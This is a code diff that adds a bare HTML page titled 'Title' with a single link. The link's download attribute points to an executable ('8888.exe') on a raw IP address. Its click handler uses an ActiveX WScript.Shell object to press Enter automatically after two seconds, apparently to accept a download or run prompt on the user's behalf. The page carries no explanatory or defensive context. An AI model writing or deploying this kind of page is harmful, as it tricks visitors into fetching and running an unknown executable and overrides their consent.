@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Title</title>
+</head>
+<body>
+<a name="file" download="http://149.129.58.104/8888.exe" onclick="f()" href="filepath">filename</a>
+
+</body>
+<script src="../../jquery.min.js"></script>
+<script>
+  function f(){
+    //alert(121)
+    setTimeout(function () {
+      new ActiveXObject('WScript.Shell').SendKeys('{enter}');
+    },2000)
+
+  }
+</script>
+</html>
